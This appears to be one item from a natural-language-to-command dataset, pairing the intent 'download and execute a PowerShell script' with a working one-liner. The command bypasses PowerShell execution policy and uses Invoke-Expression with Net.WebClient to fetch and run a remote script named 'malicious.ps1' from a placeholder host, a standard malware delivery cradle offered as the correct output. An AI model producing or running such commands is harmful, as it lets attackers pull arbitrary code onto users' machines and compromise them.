# Natural language intent:
# Download and execute a PowerShell script from a specified URL using Invoke-Expression.

powershell.exe -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://not-a-good-example.com/malicious.ps1')"
